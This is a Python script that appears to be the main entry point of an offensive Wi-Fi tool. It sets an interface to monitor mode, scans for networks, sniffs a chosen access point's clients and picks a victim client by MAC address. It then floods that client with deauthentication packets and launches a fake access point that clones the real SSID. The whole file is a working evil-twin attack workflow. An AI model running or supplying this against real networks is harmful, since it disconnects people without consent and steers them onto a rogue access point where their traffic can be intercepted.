#!/usr/bin/env python
from curses.ascii import BS
from distutils.command.build import build
import os
import sys
from scapy.all import get_if_list
import logging

import fileinput
import signal
from sys import platform
import threading
import argparse
from multiprocessing import Process

# import functions
from Deauthentication.configs.config import setMonitorMode
from Deauthentication.scanning.sniffing import sniffClients, scanNetworks
from Deauthentication.spoofing.spoofing import setTarget
from FakeAccessPoint.create_fake_ap import create_fake_access_point, build_files

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)


class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def attack():

    print(f"list of available interfaces:\n{get_if_list()}")

    interface = wlan = input(bcolors.OKGREEN+"\nEnter full interface name to set to Monitor Mode: \n \n"+bcolors.ENDC)
    #interface = wlan ='wlx000f005d5479'
    print(bcolors.OKCYAN+"\nSetting " + wlan + " to monitor mode!\n"+bcolors.ENDC)
    setMonitorMode(wlan)

    try:
        print(bcolors.WARNING+"Press Ctrl-C to finish scanning for networks"+bcolors.ENDC)
        known = scanNetworks(interface)

    except KeyboardInterrupt:
        print(bcolors.WARNING+"Press Ctrl-C to finish scanning for networks"+bcolors.ENDC)
        pass

    # Let the user input the MAC address of the router
    print(bcolors.WARNING+"Press Ctrl-C to finish scanning for networks"+bcolors.ENDC)
    BSSID = input(bcolors.OKGREEN+'\nChoose the BSSID/MAC address of the AP: \n\n'+bcolors.ENDC)
    #BSSID = 'd8:07:b6:26:2b:56'
    channel = known[BSSID][1]
    #SSID = 'Alperin'
    SSID = known[BSSID][0]
    #print('\nChanging ' + wlan + ' to channel ' + str(channel))
    #os.system("iwconfig %s channel %d" % (wlan, channel))

    print(bcolors.OKBLUE+"\nIntercepting AP clients data \n"+bcolors.ENDC)
    sniffClients(wlan, BSSID)

    brdMac = input(bcolors.OKGREEN+
        '\n\nChoose the MAC address of the client you wish to attack: \n\n'+bcolors.ENDC)
    
    #brdMac = 'ec:5c:68:03:8f:f3'
    #numOfPacks  = int(input(bcolors.OKGREEN+
    #    '\n\nChoose number of packets for deauth attack: \n\n'+bcolors.ENDC))
    print(bcolors.FAIL+'\nSending deauth packets now, press ctrl+c to end the attack'+bcolors.ENDC)

    setTarget(brdMac, interface, BSSID)

    build_files(SSID,wlan)
    create_fake_access_point(SSID)
    user_input = input('to turn off the Access Point Please press \"done\"\n')
    if user_input == 'done':
        print(bcolors.BOLD+bcolors.OKGREEN+"\nDONE! Reverting monitor card back to managed mode :)"+bcolors.ENDC + bcolors.ENDC)        #setManagerMode(wlan)
        os.system('sudo sh FakeAccessPoint/Templates/cleanup.sh')
       # print(bcolors.OKBLUE+"\n"+wlan + " is set back to managed mode"+bcolors.ENDC)
        sys.exit('Perform exit() with exit code {} , {}'.format(0, "End"))



if __name__ == "__main__":
    attack()
